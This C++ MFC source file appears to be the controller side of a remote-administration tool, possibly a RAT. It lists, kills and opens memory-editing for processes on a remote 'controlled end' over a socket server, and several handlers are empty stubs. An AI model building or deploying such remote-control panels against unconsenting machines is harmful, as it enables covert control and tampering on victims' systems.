#include "pch.h"
#include "Samsung Dive.h"
#include "ProcessManagerDlg.h"
#include "afxdialogex.h"
#include "Common.h"
#include"OpenProcessDlg.h"
#include"ChangeMemoryDlg.h"
HANDLE __ProcessIdentity;
// CProcessManager 对话框
IMPLEMENT_DYNAMIC(CProcessManagerDlg, CDialogEx)

CProcessManagerDlg::CProcessManagerDlg(CWnd* pParent, CIocpServer*
	IocpServer, CONTEXT_OBJECT* ContextObject)
	: CDialogEx(IDD_PROCESS_MANAGER_DIALOG, pParent)
{

	m_IocpServer = IocpServer;
	m_ContextObject = ContextObject;

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));

}
CProcessManagerDlg::~CProcessManagerDlg()
{
}
void CProcessManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_PROCESS_INFO_LIST, m_ProcessInfoList);
}
BEGIN_MESSAGE_MAP(CProcessManagerDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_PROCESS_INFO_LIST, &CProcessManagerDlg::OnNMCustomdrawProcessInofoList)
	ON_COMMAND(ID_REFRESH_PROCESS, &CProcessManagerDlg::OnRefreshProcess)
	ON_COMMAND(ID_KILL_PROCESS, &CProcessManagerDlg::OnKillProcess)
	ON_COMMAND(ID_SUSPEND_PROCESS, &CProcessManagerDlg::OnSuspendProcess)
	ON_COMMAND(ID_RESUME_PROCESS, &CProcessManagerDlg::OnResumeProcess)
	ON_COMMAND(ID_PROCESS_MODULES, &CProcessManagerDlg::OnProcessModules)
	ON_COMMAND(ID_PROCESS_THREADS, &CProcessManagerDlg::OnProcessThreads)
	ON_COMMAND(ID_PROCESS_MEMORY, &CProcessManagerDlg::OnProcessMemory)
	ON_COMMAND(ID_PROCESS_HANDLES, &CProcessManagerDlg::OnProcessHandles)
	ON_NOTIFY(NM_RCLICK, IDC_PROCESS_INFO_LIST, &CProcessManagerDlg::OnRclickProcessInfoList)

	ON_MESSAGE(UM_OPEN_CHANGE_MEMORY_DIALOG, &CProcessManagerDlg::OnOpenChangeMemoryDialog)
	
	
	ON_COMMAND(ID_CREATE_PROCESS, &CProcessManagerDlg::OnCreateProcess)
END_MESSAGE_MAP()


// CProcessManager 消息处理程序


BOOL CProcessManagerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	SetIcon(m_IconHwnd, FALSE);
	// TODO:  在此添加额外的初始化
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	v1.Format("\\\\%s - 远程进程管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);



	//设置对话框上数据
	LOGFONT  Logfont;
	CFont* v2 = m_ProcessInfoList.GetFont();
	v2->GetLogFont(&Logfont);
	//调整比例
	Logfont.lfHeight = Logfont.lfHeight * 1.3;   //这里可以修改字体的高比例
	Logfont.lfWidth = Logfont.lfWidth * 1.3;     //这里可以修改字体的宽比例
	CFont  v3;
	v3.CreateFontIndirect(&Logfont);
	m_ProcessInfoList.SetFont(&v3);
	m_ProcessInfoList.SetFont(&v3);
	v3.Detach();




	//被控端传回的数据
	char* BufferData = (char*)(m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(0));
	m_ProcessInfoList.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);

	switch (BufferData[0])
	{
	case CLIENT_PROCESS_MANAGER_REPLY:
	{

		m_ProcessInfoList.InsertColumn(0, _T("PID"), LVCFMT_LEFT, 80);
		m_ProcessInfoList.InsertColumn(1, _T("进程镜像"), LVCFMT_LEFT, 180);
		m_ProcessInfoList.InsertColumn(2, _T("程序路径"), LVCFMT_LEFT, 250);
		m_ProcessInfoList.InsertColumn(3, _T("程序位数"), LVCFMT_LEFT, 120);
		m_ProcessInfoList.InsertColumn(4, _T("程序个数"), LVCFMT_LEFT, 120);
		ShowProcessInfoList();   //由于第一个发送来的消息后面紧跟着进程的数据所以把数据显示到列表当中\0\0
		break;
	}
	default:
		break;
	}

	InitSolidMenu();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


void CProcessManagerDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_ContextObject != NULL)
	{

		CancelIo((HANDLE)m_ContextObject->ClientSocket);
		closesocket(m_ContextObject->ClientSocket);
	}
	CDialogEx::OnClose();
}

void CProcessManagerDlg::OnRclickProcessInfoList(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
			/*CListCtrl* ListCtrl = NULL;*/
		/*	if (processmanagerDlg.m_ProcessInfoList.IsWindowVisible())
				ListCtrl = &processmanagerDlg.m_ProcessInfoList;
			else
				return FALSE;*/

	//HANDLE JudgeProcedureHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)JudgeThreadProcedure, (void*)this,
	//	0,
	//	NULL);
	

	


	CMenu Menu;
	Menu.LoadMenu(IDR_CLIENT_PROCESS_MENU);
	CPoint Point;
	GetCursorPos(&Point);
	SetForegroundWindow();   //设置当前窗口
	Menu.GetSubMenu(0)->TrackPopupMenu(
		TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
		Point.x, Point.y, this, NULL);
	if(pResult!=NULL){ *pResult = 0; }


}
 /*DWORD WINAPI CProcessManagerDlg::JudgeThreadProcedure(LPVOID ParameterData)
{
	CProcessManagerDlg* p1 = (CProcessManagerDlg*)ParameterData;
	
	 POSITION Position = p1->m_ProcessInfoList.GetFirstSelectedItemPosition();

	 if (Position == NULL)
	 {
		 p1->MessageBox(NULL, NULL);
	 }
	 else
	 {
		 while (Position)
		 {
			 int nItem = p1->m_ProcessInfoList.GetNextSelectedItem(Position);
			 
			 CString str = p1->m_ProcessInfoList.GetItemText((int)Position - 1, 0);
			 strcpy(__ProcessIdentity, str);
		 }
	 }

	 
	 

	 return TRUE;
	
}*/

void CProcessManagerDlg::OnNMCustomdrawProcessInofoList(NMHDR* pNMHDR, LRESULT* pResult)
{
	NMLVCUSTOMDRAW* pLVCD = reinterpret_cast<NMLVCUSTOMDRAW*>(pNMHDR);
	// Take the default processing unless we set this to something else below.  
	*pResult = CDRF_DODEFAULT;

	if (CDDS_PREPAINT == pLVCD->nmcd.dwDrawStage)
	{
		*pResult = CDRF_NOTIFYITEMDRAW;
	}
	else if (CDDS_ITEMPREPAINT == pLVCD->nmcd.dwDrawStage)
	{
		*pResult = CDRF_NOTIFYSUBITEMDRAW;
	}
	else if ((CDDS_ITEMPREPAINT | CDDS_SUBITEM) == pLVCD->nmcd.dwDrawStage)
	{
		COLORREF NewTextColor, NewBackgroundColor;
		int     Item = static_cast<int>(pLVCD->nmcd.dwItemSpec);
		CString ProcessImageName = m_ProcessInfoList.GetItemText(Item, 1);
		if (_tcscmp(ProcessImageName.GetBuffer(0), _T("explorer.exe")) == 0)
		{
			NewTextColor = RGB(0, 0, 0);          //黑色
			NewBackgroundColor = RGB(255, 0, 0);    //红色       RGB(0,255,0)绿色
		}
		else if (_tcscmp(ProcessImageName.GetBuffer(0), _T("CalculatorApp.exe")) == 0)
		{
			NewTextColor = RGB(0, 0, 0);         //黑色
			NewBackgroundColor = RGB(0, 0, 255);   //蓝色
		}

		else {
			NewTextColor = RGB(0, 0, 0);          //黑色
			NewBackgroundColor = RGB(255, 255, 255);    //白色
		}

		pLVCD->clrText = NewTextColor;
		pLVCD->clrTextBk = NewBackgroundColor;
		*pResult = CDRF_DODEFAULT;
	}
}


void CProcessManagerDlg::ShowProcessInfoList(void)
{
	char* BufferData = (char*)(m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(1));
	char* ProcessImageName = NULL;
	char* ProcessFullPath = NULL;
	char* IsWow64Process = NULL;
	DWORD	Offset = 0;
	CString v1;
	m_ProcessInfoList.DeleteAllItems();
	//遍历发送来的每一个字符别忘了他的数据结构啊 Id+进程名+0+完整名+0
	int i;
	for (i = 0; Offset < m_ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength() - 1; i++)
	{
		HANDLE* ProcessIdentity = (HANDLE*)(BufferData + Offset);              //进程ID
		ProcessImageName = BufferData + Offset + sizeof(HANDLE);         //进程名
		ProcessFullPath = ProcessImageName + lstrlen(ProcessImageName) + 1;            //进程完整路径
		IsWow64Process = ProcessFullPath + lstrlen(ProcessFullPath) + 1;

		v1.Format(_T("%5u"), *ProcessIdentity);
		m_ProcessInfoList.InsertItem(i, v1);       //将得到的数据加入到列表当中
		m_ProcessInfoList.SetItemText(i, 1, ProcessImageName);
		m_ProcessInfoList.SetItemText(i, 2, ProcessFullPath);
		m_ProcessInfoList.SetItemText(i, 3, IsWow64Process);
		//ItemData 为进程ID
		m_ProcessInfoList.SetItemData(i, (DWORD_PTR)*ProcessIdentity);   //设置为隐藏数据
		//跳过这个数据结构进入下一个循环
		Offset += sizeof(HANDLE) + lstrlen(ProcessImageName) + lstrlen(ProcessFullPath) + lstrlen(IsWow64Process) + 3;

	}

	v1.Format(_T("程序个数 / %d"), i);
	LVCOLUMN v3;
	v3.mask = LVCF_TEXT;
	v3.pszText = v1.GetBuffer(0);
	v3.cchTextMax = v1.GetLength();
	m_ProcessInfoList.SetColumn(4, &v3); //在列表中显示有多少个进程
}
void CProcessManagerDlg::GetProcessInfoList()
{
	BYTE IsToken = CLIENT_PROCESS_MANAGER_REFRESH_REQUIRE;
	m_IocpServer->OnPrepareSending(m_ContextObject, &IsToken, 1);
}

void CProcessManagerDlg::OnReceiveComplete(void)
{
	switch (m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(0)[0])
	{
	case CLIENT_PROCESS_MANAGER_REPLY:
	{

		ShowProcessInfoList();
		break;
	}

	default:
	{
		break;
	}
	}
	return;
}

//将数据包发送至客户端
VOID CProcessManagerDlg::SendingSelectedCommand(PBYTE BufferData, ULONG BufferLength)
{

	//从ListControl上的隐藏项中选取中Context
	POSITION Position = m_ClientInfo_List.GetFirstSelectedItemPosition();
	//该代码支持多项选择
	while (Position)
	{
		int	Item = m_ClientInfo_List.GetNextSelectedItem(Position);
		//获得该排的隐藏数据项得到Context
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_ClientInfo_List.GetItemData(Item);   //上线显示的函数中插入一个Context隐藏数据


		//通信类负责发送数据
		m_IocpServer->OnPrepareSending(ContextObject, BufferData, BufferLength);

	}
}


void CProcessManagerDlg::OnRefreshProcess()
{

	// TODO: 在此添加命令处理程序代码
	GetProcessInfoList();
}


void CProcessManagerDlg::OnKillProcess()
{
	// TODO: 在此添加命令处理程序代码

	CListCtrl* ListCtrl = NULL;
	if (m_ProcessInfoList.IsWindowVisible())
		ListCtrl = &m_ProcessInfoList;
	else
		return;

	//[KILL][ID][ID][iD][ID]
	//非配缓冲区

	//单字数据  网路数据
	LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, 1 + (ListCtrl->GetSelectedCount() * sizeof(HANDLE)));//1.exe  4  ID   Handle
	//加入结束进程的数据头
	BufferData[0] = CLIENT_PROCESS_MANAGER_KILL_REQUIRE;
	//显示警告信息
	TCHAR* Tips = _T("警告: 终止进程会导致不希望发生的结果，\n"
		"包括数据丢失和系统不稳定。在被终止前，\n"
		"进程将没有机会保存其状态和数据。");
	CString v1;

	//选择了几项进程
	if (ListCtrl->GetSelectedCount() > 1)
	{
		v1.Format(_T("%s确实\n想终止这%d项进程吗?"), Tips, ListCtrl->GetSelectedCount());
	}
	else
	{
		v1.Format(_T("%s确实\n想终止该项进程吗?"), Tips);
	}
	//SDK 
	if (::MessageBox(m_hWnd, v1, _T("进程结束警告"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;
	//MFC
	/*
	if (MessageBox(v1, _T("进程结束警告", MB_YESNO | MB_ICONQUESTION))== IDNO)
	{
		return;
	}
	*/
	//Offset
	//[Flag][][][][][]
	DWORD	Offset = 1;
	POSITION Position = ListCtrl->GetFirstSelectedItemPosition();
	//得到要结束哪个进程

	while (Position)
	{
		int	Item = ListCtrl->GetNextSelectedItem(Position);
		HANDLE ProcessIdentity = (HANDLE)ListCtrl->GetItemData(Item);
		memcpy(BufferData + Offset, &ProcessIdentity, sizeof(HANDLE));  
		Offset += sizeof(HANDLE);
	}
	//发送数据到被控端在被控端中查找CLIENT_PROCESS_MANAGER_KILL_REQUIRE这个数据头
	m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, LocalSize(BufferData));
	LocalFree(BufferData);

	Sleep(100);

	//以发消息的方式调用函数，启用一个线程来执行目标函数，防止死循环
	PostMessage(WM_COMMAND, MAKEWPARAM(ID_REFRESH_PROCESS, BN_CLICKED));

}
void CProcessManagerDlg::InitSolidMenu()
{
	HMENU  MenuObject;    //定义一个菜单对象    将数据型数据转换成字符型数据
	MenuObject = LoadMenu(NULL, MAKEINTRESOURCE(IDR_PROCESS_MANAGER_DIALOG_MAIN_MENU));        //将菜单对象载入菜单资源   将资源ID转换成字符型数据
	::SetMenu(this->GetSafeHwnd(), MenuObject);                                       //将带有资源的菜单对象设置到当前主窗口句柄上
	::DrawMenuBar(this->GetSafeHwnd());              //上面两个打::的函数，均为SDK的方法
	
}


void CProcessManagerDlg::OnSuspendProcess()
{
	// TODO: 在此添加命令处理程序代码
}

void CProcessManagerDlg::OnResumeProcess()
{
	// TODO: 在此添加命令处理程序代码
}




void CProcessManagerDlg::OnProcessModules()
{
	// TODO: 在此添加命令处理程序代码
}


void CProcessManagerDlg::OnProcessThreads()
{
	// TODO: 在此添加命令处理程序代码
}


void CProcessManagerDlg::OnProcessMemory()
{


	// TODO: 在此添加命令处理程序代码
	POSITION Position = this->m_ProcessInfoList.GetFirstSelectedItemPosition();
	int Item = this->m_ProcessInfoList.GetNextSelectedItem(Position);
	__ProcessIdentity = (HANDLE)(this->m_ProcessInfoList.GetItemData(Item));
	
		
	int BufferLength = sizeof(HANDLE) + sizeof(BYTE);
	LPBYTE BufferData = new BYTE[BufferLength];
	BufferData[0] = CLIENT_REMOTE_CHANGE_MEMORY_REQUIRE;
	memcpy(BufferData + sizeof(BYTE), &__ProcessIdentity, sizeof(HANDLE));

	m_IocpServer->OnPrepareSending(m_ContextObject, (PBYTE)BufferData, BufferLength);

	//弹出二级窗口
	PostMessage(UM_OPEN_CHANGE_MEMORY_DIALOG, (WPARAM)__ProcessIdentity, (LPARAM)m_ContextObject);



}


void CProcessManagerDlg::OnProcessHandles()
{
	// TODO: 在此添加命令处理程序代码
}





void CProcessManagerDlg::OnCreateProcess()
{
	// TODO: 在此添加命令处理程序代码
	
	////动态窗口  
	COpenProcessDlg* Dialog = new COpenProcessDlg(this, m_IocpServer, m_ContextObject);
	// 设置父窗口为桌面
	Dialog->Create(IDD_OPEN_PROCESS_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);
	Sleep(100);
	PostMessage(WM_COMMAND, MAKEWPARAM(ID_REFRESH_PROCESS, BN_CLICKED));
}

LRESULT CProcessManagerDlg::OnOpenChangeMemoryDialog(WPARAM processID, LPARAM contextObject)
{

	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)contextObject;

	//非阻塞对话框
	CChangeMemoryDlg* Dialog = new CChangeMemoryDlg(this, m_IocpServer, ContextObject);
	//m_CreateProcessDlg = Dialog;
	// 设置父窗口为卓面
	Dialog->Create(IDD_QUERY_MEMORY_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);


	m_ContextObject->ChangeMemoryDlg = Dialog;
	return 0;
}